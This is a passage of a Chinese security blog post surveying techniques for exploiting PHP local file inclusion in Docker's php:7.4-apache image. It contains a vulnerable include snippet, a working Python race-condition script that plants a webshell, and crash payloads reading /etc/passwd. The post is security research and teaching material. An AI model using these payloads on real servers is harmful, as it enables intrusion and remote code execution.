
<!DOCTYPE html>
<html lang=en>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="HandheldFriendly" content="True">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
  <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。">
  <meta name="keywords" content="phith0n,网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python">
  <link rel="shortcut icon" href="../static/cactus/images/favicon.ico">
  <link rel="icon" type="image/png" href="../static/cactus/images/favicon-192x192.png" sizes="192x192">
  <link rel="apple-touch-icon" sizes="180x180" href="../static/cactus/images/apple-touch-icon.png">
  <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌"/>

  <title>Docker PHP裸文件本地包含综述 | 离别歌</title>
  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.staticfile.org/bootstrap/5.1.3/css/bootstrap-grid.min.css">
  <link rel="stylesheet" href="../static/cactus/css/style%EF%B9%96v=20220521.css">
  
  <link rel="stylesheet" href="../static/cactus/css/code%EF%B9%96v=20211026.css">
  <link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">

</head>
<body>



  <div class="sticky">
    <a href="#" id="menu-icon" class="menu-icon active"><i class="fa fa-bars fa-lg"></i></a>
    <div class="menu">
      <ul>
        <li><a href="../index.html">主页</a></li>
        <li><a href="javascript:history.back(-1)">返回</a></li>
      </ul>
      <br>
    </div>
    <div class="clearfix"></div>
    <div class="info" style="position: fixed">
      <span id="i-top" style="display: none">Back to top</span>
      <span id="i-share" style="display: none">Share post</span>
    </div>
    <ul class="actions">
      <li><a class="icon" href="#" id="back-top"><i
          class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();"
          onmouseout="$('#i-top').toggle();"></i></a></li>
      <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true"
                                      onmouseover="$('#i-share').toggle();"
                                      onmouseout="$('#i-share').toggle();"
                                      onclick="$('#share').toggleClass('hidden');return false;"></i></a></li>
    </ul>
    <div id="share" class="hidden">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/docker-php-include-getshell.html"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&amp;text=Docker%20PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E7%BB%BC%E8%BF%B0"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&amp;title=Docker%20PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E7%BB%BC%E8%BF%B0"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&amp;is_video=false&amp;description=Docker%20PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E7%BB%BC%E8%BF%B0"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Docker%20PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E7%BB%BC%E8%BF%B0&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/docker-php-include-getshell.html"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&amp;title=Docker%20PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E7%BB%BC%E8%BF%B0"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&amp;title=Docker%20PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E7%BB%BC%E8%BF%B0"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&amp;title=Docker%20PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E7%BB%BC%E8%BF%B0"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&amp;title=Docker%20PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E7%BB%BC%E8%BF%B0"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/docker-php-include-getshell.html&amp;name=Docker%20PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E7%BB%BC%E8%BF%B0&amp;description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>
    </div>
  </div>

  <div class="container-md">
    <div class="article row justify-content-center min-height">
      <div class="col-lg-8 col-md-10 col-sm-12">
        <article itemscope itemtype="http://schema.org/BlogPosting">
          <header class="post-header">
            <h1 class="color-main h1 mb-0" itemprop="name headline">Docker PHP裸文件本地包含综述</h1>
            <div class="meta">
              <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
                <span itemprop="name">phithon</span>
              </span>

              <div class="postdate">
                <time datetime="2021年11月1日 17:49" itemprop="datePublished">
                  2021 十一月 01 17:49
                </time>
              </div>

              <div class="article-tag">
                阅读：54170
              </div>

              
                <div class="article-tag">
                  <i class="fa fa-bookmark"></i>
                  <a class="tag-link" href="../sort/PENETRATION.html">网络安全</a>
                </div>
              

              
                <div class="article-tag">
                  <i class="fa fa-tag"></i>
                  
                    <a class="tag-link" href="../tag/Docker.html">Docker</a>,
                  
                  
                    <a class="tag-link" href="../tag/PHP%E5%AE%89%E5%85%A8.html">PHP安全</a>
                  
                </div>
              
            </div>
          </header>
          <div class="content" itemprop="articleBody">
            <blockquote>
<p>本文首发在<a href="https://tttang.com/archive/1312/" target="_blank">跳跳糖社区</a>。</p>
</blockquote>
<p>2018年『代码审计』星球举办的<a href="https://code-breaking.com/" target="_blank">Code-Breaking Puzzles</a>非常成功，后面我就一直想再做一次类似的活动。Code-Breaking属于极其偏向于trick分享的代码审计谜题，所以要求题目具有一定的独创性，最好是能用10行以内的代码片段，描述一个具有实战价值的场景。</p>
<p>大概在去年疫情在家办公那段时间，有个同学问过我一个问题，他遇到了一个PHP文件包含漏洞，但找不到利用方法，目标是跑在Docker里，也没找到太多可以利用的文件。我当时觉得这是老生常谈的问题了，就跟他讲了几个我已知的方法，但后来我自己下去研究的时候又发现了一种新方法，个人感觉还挺适合放到Code-Breaking里作为题目的，就暂放到题库里了。</p>
<p>没想到Code-Breaking一直难产到了2021年，直到十一期间我在研究Caddy相关的安全问题时，无意间看到一篇RCTF 2021的Writeup，才发现这个trick被用掉了（最早出现在2020年巅峰极客比赛中）。有点心痛，于是把所有方法整理一下发表了这篇文章，也算没把研究成果浪费掉。</p>
<p>这篇文章研究的题目是：<strong>在使用Docker官方的PHP镜像<code>php:7.4-apache</code>时，Web应用存在文件包含漏洞，在没有文件上传的情况下如何利用？</strong></p>
<p>我们可以使用docker启动一个服务器进行测试，命令是<code>docker run -d --name web -p 8080:80 -v $(pwd):/var/www/html php:7.4-apache</code>，文件包含的代码如下：</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">include</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</code></pre></div>

<h2 id="0x01"><a class="toclink" href="#0x01">0x01 日志文件包含为什么不行？</a></h2>
<p>这个问题经常在实战中遇到了，特别是黑盒的情况下，功能点也少，找不到可以被包含的文件。通常此时我们会去尝试包含一些系统日志、Web日志等系统文件。</p>
<p>但是，如果目标在Docker环境中会具有如下特点：</p>
<ul>
<li>容器只会运行Apache，所以没有第三方软件日志</li>
<li>Web日志重定向到了<code>/dev/stdout</code>、<code>/dev/stderr</code></li>
</ul>
<p>我们可以查看<a href="https://github.com/docker-library/php/blob/41d3146/7.4/buster/apache/Dockerfile#L85" target="_blank">PHP的Dockerfile</a>，会发现有几个日志文件都被使用标准输出、标准错误的软链接替代了：</p>
<div class="codehilite"><pre><span></span><code><span class="c"># logs should go to stdout / stderr</span>
    ln -sfT /dev/stderr <span class="s2">&quot;</span><span class="nv">$APACHE_LOG_DIR</span><span class="s2">/error.log&quot;</span><span class="p">;</span> <span class="se">\</span>
    ln -sfT /dev/stdout <span class="s2">&quot;</span><span class="nv">$APACHE_LOG_DIR</span><span class="s2">/access.log&quot;</span><span class="p">;</span> <span class="se">\</span>
    ln -sfT /dev/stdout <span class="s2">&quot;</span><span class="nv">$APACHE_LOG_DIR</span><span class="s2">/other_vhosts_access.log&quot;</span><span class="p">;</span> <span class="se">\</span>
    # ...
</code></pre></div>

<p>此时包含这些Web日志会出现<code>include(/dev/pts/0): failed to open stream: Permission denied</code>的错误，因为PHP没有权限包含设备文件：</p>
<p><a href="../media/attachment/2021/11/01/e8198610-1181-4f2b-8e49-c7348a9a9bef.png"><img alt="image.png" src="../media/attachment/2021/11/01/e8198610-1181-4f2b-8e49-c7348a9a9bef.7a577b438fb6.png" /></a></p>
<p>所以，利用日志包含来getshell的方法就无法进行了。</p>
<p>远程包含因为默认不开启，所以我们也不作为一个候选项，想要getshell还是需要找到一个可以控制内容的文件进行包含。</p>
<h2 id="0x02-phpinfo"><a class="toclink" href="#0x02-phpinfo">0x02 phpinfo与条件竞争</a></h2>
<p>第二个想到的方法自然就是经典的临时文件包含，这个方法出自于Insomniasec的安全研究员Brett Moore在2011年的一篇Paper《<a href="https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf" target="_blank">LFI WITH PHPINFO() ASSISTANCE</a>》。</p>
<p>我们对任意一个PHP文件发送一个上传的数据包时，不管这个PHP服务后端是否有处理<code>$_FILES</code>的逻辑，PHP都会将用户上传的数据先保存到一个临时文件中，这个文件一般位于系统临时目录，文件名是php开头，后面跟6个随机字符；在整个PHP文件执行完毕后，这些上传的临时文件就会被清理掉。</p>
<p>所以，临时文件的生命周期大概是这样（图来自<a href="https://gynvael.coldwind.pl/?id=50" target="_blank">Gynvael Coldwind</a>）：</p>
<p><a href="../media/attachment/2021/11/01/16dc9c76-3d84-4dcf-9e36-669f4c743991.png"><img alt="image.png" src="../media/attachment/2021/11/01/16dc9c76-3d84-4dcf-9e36-669f4c743991.8f5605888493.png" /></a></p>
<p>在从“PHP writes data to temp file”到“php removes temp files(if any)”这两个操作之间的这段时间，我们可以包含这个临时文件，最后完成getshell操作。但这里面暗藏了一个大坑就是，<strong>临时文件的文件名我们是不知道的</strong>。</p>
<p>所以这个利用的条件就是，需要有一个地方能获取到文件名，例如phpinfo。phpinfo页面中会输出这次请求的所有信息，包括<code>$_FILES</code>变量的值，其中包含完整文件名：</p>
<p><a href="../media/attachment/2021/11/01/97369ebf-0c5b-4fcd-94ca-382e92f06685.png"><img alt="image.png" src="../media/attachment/2021/11/01/97369ebf-0c5b-4fcd-94ca-382e92f06685.6faa5fd57e52.png" /></a></p>
<p>但第二个难点就是，即使我们能够在目标网站上找到一个phpinfo页面并读取到临时文件名，这个文件名也是这一次请求里的临时文件，在这次请求结束后这个临时文件就会被删掉，并不能在后面的文件包含请求中使用。</p>
<p>所以此时需要利用到条件竞争（Race Condition），原理也好理解——我们用两个以上的线程来利用，其中一个发送上传包给phpinfo页面，并读取返回结果，找到临时文件名；第二个线程拿到这个文件名后马上进行包含利用。</p>
<p>这是一个很理想的状态，现实情况下我们需要借助下面这些方法来提高成功率：</p>
<ul>
<li>使用大量线程来进行第二个操作，来让包含操作尽可能早于临时文件被删除</li>
<li>如果目标环境开启了<code>output_buffering</code>这个配置（在某些环境下是默认的），那么phpinfo的页面将会以流式，即chunked编码的方式返回。这样，我们可以不必等到phpinfo完全显示完成时就能够读取到临时文件名，这样成功率会更高</li>
<li>我们可以在请求头、query string里插入大量垃圾字符来使phpinfo页面更大，返回的时间更久，这样临时文件保存的时间更长。但这个方法在不开启<code>output_buffering</code>时是没有影响的。</li>
</ul>
<p>经过测试我发现，不管目标环境是否开启<code>output_buffering</code>，都可以利用成功，可能只是成功率有所差别：</p>
<p><a href="../media/attachment/2021/11/01/ee3e922f-96c4-4f15-99d8-2101dacd6fe1.png"><img alt="image.png" src="../media/attachment/2021/11/01/ee3e922f-96c4-4f15-99d8-2101dacd6fe1.88211f4b6d66.png" /></a></p>
<p>这里面的<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py" target="_blank">exp.py</a>即为原作者给出的利用脚本。我在Docker PHP 7.4下用150线程进行了大概20次尝试，最终成功，成功后会写入一个新的文件<code>/tmp/g</code>，这个文件就不会被删除了。</p>
<p>这个利用方法有一处真实案例可以参考：《<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0151653" target="_blank">自如网某业务文件包含导致命令执行（LFI + PHPINFO getshell 实例）</a>》。</p>
<h2 id="0x03-windows"><a class="toclink" href="#0x03-windows">0x03 Windows 通配符妙用</a></h2>
<p>0x02中的利用方法需要两个条件：</p>
<ol>
<li>存在phpinfo等可以泄露临时文件名的页面</li>
<li>网络条件好，才能让Race Condition成功</li>
</ol>
<p>特别是第一个，现在很少有机会让我们在实战中找到phpinfo页面。但是如果目标操作系统是Windows，我们可以借助一些特殊的Tricks来实现文件包含的利用。</p>
<p>PHP在读取Windows文件时，会使用到<a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfileexw" target="_blank">FindFirstFileExW</a>这个Win32 API来查找文件，而这个API是支持使用通配符的：</p>
<blockquote>
<p><strong>lpFileName</strong></p>
<p>The directory or path, and the file name. The file name can include wildcard characters, for example, an asterisk (*) or a question mark (?).</p>
</blockquote>
<p>实际测试下来，PHP中星号和问号并不能直接作为通配符使用。</p>
<p>但我们在<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-_fsrtl_advanced_fcb_header-fsrtlisnameinexpression" target="_blank">MSDN官方文档</a>中还可以看到这样的说明：</p>
<blockquote>
<p>The following wildcard characters can be used in the pattern string.</p>
<p>Wildcard character  Meaning</p>
<p><strong>*</strong> (asterisk)               Matches zero or more characters.</p>
<p><strong>?</strong> (question mark)   Matches a single character.</p>
<p><strong>DOS_DOT</strong>                 Matches either a period or zero characters beyond the name string.</p>
<p><strong>DOS_QM</strong>                  Matches any single character or, upon encountering a period or end of name string, advances the expression to the end of the set of contiguous DOS_QMs.</p>
<p><strong>DOS_STAR</strong>               Matches zero or more characters until encountering and matching the final . in the name.</p>
</blockquote>
<p>其中除了星号和问号外，还提到了三个特殊符号DOS_DOT、DOS_QM、DOS_STAR，虽然官方并没有在文档中给出他们对应的值具体是什么，但在ntifs.h头文件中还是能找到他们的定义：</p>
<div class="codehilite"><pre><span></span><code><span class="c1">//  The following constants provide addition meta characters to fully</span>
<span class="c1">//  support the more obscure aspects of DOS wild card processing.</span>

<span class="cp">#define DOS_STAR        (L&#39;&lt;&#39;)</span>
<span class="cp">#define DOS_QM          (L&#39;&gt;&#39;)</span>
<span class="cp">#define DOS_DOT         (L&#39;&quot;&#39;)</span>
</code></pre></div>

<p>也就是说：</p>
<ul>
<li>DOS_STAR：即 <code>&lt;</code>，匹配0个以上的字符</li>
<li>DOS_QM：即<code>&gt;</code>，匹配1个字符</li>
<li>DOS_DOT：即<code>"</code>，匹配点号</li>
</ul>
<p>这样，我们在Windows下，可以使用上述通配符来替代临时文件名中的随机字符串：<code>C:\Windows\Temp\php&lt;&lt;</code>。（由于Windows内部的一些不太明确的原因，这里一般需要用两个<code>&lt;</code>来匹配多个字符）</p>
<p>我们直接向含有文件包含漏洞的页面发送一个上传包：</p>
<p><a href="../media/attachment/2021/11/01/c6d69d9f-7ce0-4a16-b10f-15ef6baa1720.png"><img alt="image.png" src="../media/attachment/2021/11/01/c6d69d9f-7ce0-4a16-b10f-15ef6baa1720.0e7146375019.png" /></a></p>
<p>根据前文给出的临时文件生命周期，我们上传的文件会在执行文件包含前被写入临时文件中；文件包含时我们借助Windows的通配符特性，在临时文件名未知的情况下成功包含，执行任意代码。</p>
<p>说句题外话，这种上传文件的同时利用临时文件的操作，我在另一篇文章《<a href="webshell-without-alphanum-advanced.html" target="_blank">无字母数字webshell之提高篇</a>》中也利用过，但是有的新人朋友还是很难理解这个过程：</p>
<p><a href="../media/attachment/2021/11/01/77f02128-e595-457e-8c6f-f8fa783eac4d.png"><img alt="image.png" src="../media/attachment/2021/11/01/77f02128-e595-457e-8c6f-f8fa783eac4d.c09fdd68253b.png" /></a></p>
<p>这确实是一个比较需要从程序员思维转换到黑客思维的过程，很多人最难理解的地方为什么明明看似是两个操作（文件上传+文件包含），却在一个请求中执行了，如果有这个疑问，那么还是需要再继续理解理解整个流程。</p>
<h2 id="0x04-sessionupload_progresssession"><a class="toclink" href="#0x04-sessionupload_progresssession">0x04 <code>session.upload_progress</code>与Session文件包含</a></h2>
<p>上述的两个方法，其实都没有解决本篇文章遇到的问题，毕竟Docker环境即不存在phpinfo也不存在Windows特性。</p>
<p>第三个方法也已经广为流传，PHP中可以通过session progress功能实现临时文件的写入。这种利用方式需要满足下面几个条件：</p>
<ul>
<li>目标环境开启了<code>session.upload_progress.enable</code>选项</li>
<li>发送一个文件上传请求，其中包含一个文件表单和一个名字是<code>PHP_SESSION_UPLOAD_PROGRESS</code>的字段</li>
<li>请求的Cookie中包含Session ID</li>
</ul>
<p>这个方法的原理是，PHP在开启了<code>session.upload_progress.enable</code>后（在包括Docker的大部分环境下默认是开启的），将会把用户上传文件的信息保存在Session中，而PHP的Session默认是保存在文件里的。</p>
<p>所以当攻击者发送满足上述条件的数据包时，就等于能够控制Session文件内容。</p>
<p>我们可以尝试发送满足上述条件的数据包来测试一下，但会发现虽然我们可以让PHP开启Session，从而在/tmp目录下遗留下Session文件，但这个文件内容是空的。</p>
<p>原因是，PHP中还有另外一个配置项<code>session.upload_progress.cleanup</code>，默认开启。在这个选项开启时，PHP会在上传请求被读取完成后自动清理掉这个Session，如果我们尝试把这个选项关闭，就可以读取到Session文件的内容了：</p>
<p><a href="../media/attachment/2021/11/01/f328427d-cb91-4e7c-924c-0dacb8e34e8d.png"><img alt="image.png" src="../media/attachment/2021/11/01/f328427d-cb91-4e7c-924c-0dacb8e34e8d.dd2cfc9ada9e.png" /></a></p>
<blockquote>
<p>注意的是，如果我们只上传一个文件，这里也是不会遗留下Session文件的，所以表单里必须有两个以上的文件上传。</p>
</blockquote>
<p>所以，默认情况下，我们需要在Session文件被清理前利用它，这也会用到条件竞争（Race Condition）。</p>
<p>因为这里的Session文件名是可控的，所以相比于0x02的条件竞争，这个会简单很多。我写了一个小脚本来利用，几乎没有失败过：</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span><span class="p">,</span> <span class="n">wait</span>

<span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://192.168.1.162:8080/index.php&#39;</span>
<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;helloworld&#39;</span>


<span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">e</span><span class="p">:</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">):</span>
    <span class="n">files</span> <span class="o">=</span> <span class="p">[</span>
        <span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;load.png&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">40960</span><span class="p">,</span> <span class="s1">&#39;image/png&#39;</span><span class="p">)),</span>
    <span class="p">]</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span> <span class="sa">rf</span><span class="s1">&#39;&#39;&#39;&lt;?php file_put_contents(&#39;/tmp/success&#39;, &#39;&lt;?=phpinfo()?&gt;&#39;); echo(&#39;</span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s1">&#39;); ?&gt;&#39;&#39;&#39;</span><span class="p">}</span>

    <span class="k">while</span> <span class="ow">not</span> <span class="n">e</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
        <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
            <span class="n">target</span><span class="p">,</span>
            <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span>
            <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span>
            <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">flag</span><span class="p">},</span>
        <span class="p">)</span>


<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">e</span><span class="p">:</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">):</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="n">e</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
            <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s1">?file=/tmp/sess_</span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
        <span class="p">)</span>

        <span class="k">if</span> <span class="n">flag</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
            <span class="n">e</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">futures</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">event</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
    <span class="n">pool</span> <span class="o">=</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
        <span class="n">futures</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">pool</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">upload</span><span class="p">,</span> <span class="n">event</span><span class="p">))</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
        <span class="n">futures</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">pool</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">event</span><span class="p">))</span>

    <span class="n">wait</span><span class="p">(</span><span class="n">futures</span><span class="p">)</span>
</code></pre></div>

<p>脚本执行完毕后会在目标中写入<code>/tmp/success</code>文件，里面即为Webshell：</p>
<p><a href="../media/attachment/2021/11/01/1d135d76-2103-4e78-b097-5c728bd72166.png"><img alt="image.png" src="../media/attachment/2021/11/01/1d135d76-2103-4e78-b097-5c728bd72166.cc27abfb7aa5.png" /></a></p>
<h2 id="0x05-segfaulttemp"><a class="toclink" href="#0x05-segfaulttemp">0x05 Segfault遗留下TEMP文件</a></h2>
<p>那么，如果关闭了<code>session.upload_progress.enable</code>，是否还有其他利用方法呢？</p>
<p>我们的目的是在服务器上留下一个内容可控的文件，最简单的方法就是利用上传包的临时文件。但这个临时文件之所以不能直接利用，原因有两点：</p>
<ul>
<li>临时文件名是随机的</li>
<li>临时文件在请求结束后会被删除</li>
</ul>
<p>如果说第一点我们可以通过爆破来解决，那么第二点是一定无法同时解决的——我们不可能在请求结束前爆破出临时文件名。</p>
<p>经过上面的分析，我们很容易想到一种解决方案：<strong>如果我们可以让PHP进程在请求结束前出现异常退出执行，那么临时文件就可以免于被删除了</strong>。</p>
<p>PHP底层是C语言开发的，不少内存错误都会导致进程异常退出，当然不论是Apache还是PHP-FPM都会存在master进程，在某一个子进程异常退出后会拉起新的进程来处理用户请求，不用担心搞挂服务器。</p>
<p>国内的安全研究者<a href="https://www.jianshu.com/p/dfd049924258" target="_blank">@王一航</a> 曾发现过一个会导致PHP crash的方法：</p>
<div class="codehilite"><pre><span></span><code><span class="k">include</span> <span class="s1">&#39;php://filter/string.strip_tags/resource=/etc/passwd&#39;</span><span class="p">;</span>
</code></pre></div>

<p>正好用在文件包含的逻辑中。</p>
<p>这个Bug在<a href="https://github.com/php/php-src/commit/791f07e4f06a943bd7892bdc539a7313fb3d6d1e" target="_blank">7.1.20</a>以后被修复，也没有留下更新日志，我们可以使用7.1.19版本的PHP进行尝试。向文件包含的目标发送这个导致crash的路径，可见服务器已经挂了，返回空白：</p>
<p><a href="../media/attachment/2021/11/01/e6fd29e5-02b4-406a-829a-c13f2352057d.png"><img alt="image.png" src="../media/attachment/2021/11/01/e6fd29e5-02b4-406a-829a-c13f2352057d.6fa525d97b76.png" /></a></p>
<p>我们可以尝试发送10次这个请求，然后来到容器里，可见有10个临时文件都被留在了/tmp目录里：</p>
<p><a href="../media/attachment/2021/11/01/bbf32cb7-7ebe-4812-aca8-a4688ad0f19a.png"><img alt="image.png" src="../media/attachment/2021/11/01/bbf32cb7-7ebe-4812-aca8-a4688ad0f19a.118a4e642f82.png" /></a></p>
<p>这就好办了，我们剩下的工作就是爆破这10个临时文件的文件名。只要任意一个命中即可。</p>
<p>我们也可以在一个数据包里多放一些文件表单（默认最多可以有20个），然后多发送几次数据包，这样就可以在遗留下很多临时文件，极大地增加了爆破成功率，减少了爆破所需要的时间。</p>
<p>类似的还有后来<a href="https://bugs.php.net/bug.php?id=77231" target="_blank">@wupco</a>发现的<code>php://filter</code>中另一个可以导致crash的方法，测试代码是：</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nb">file</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="s1">&#39;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span><span class="p">));</span>
</code></pre></div>

<p>不过在文件包含场景下，这个POC涉及到<code>data:</code>协议，会因为<code>allow_url_include=Off</code>而失败。</p>
<p>除了这些利用文件包含本身来crash PHP进程的方法以外，通过一些更通用的无需依赖代码的crash方法也存在，比如<a href="https://bugs.php.net/bug.php?id=78875" target="_blank">https://bugs.php.net/bug.php?id=78875</a>、<a href="https://bugs.php.net/bug.php?id=78876" target="_blank">https://bugs.php.net/bug.php?id=78876</a>，但都有一些额外条件。</p>
<p>好在PHP是一个开源的语言，后续我们可以通过阅读底层源码，找找能在最新版本下利用的新crash点。</p>
<h2 id="0x06-pearcmdphp"><a class="toclink" href="#0x06-pearcmdphp">0x06 <code>pearcmd.php</code>的巧妙利用</a></h2>
<p>最后这个是我想介绍的被我“捂烂了”的trick，就是利用<code>pearcmd.php</code>这个pecl/pear中的文件。</p>
<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
<p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
<p>原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p>
<p>我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER['argv']</code>几个变量。</p>
<p>如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了<code>register_argc_argv</code>，那么这其中是怎么处理的？</p>
<p>我们在PHP源码中可以看到这样的逻辑：</p>
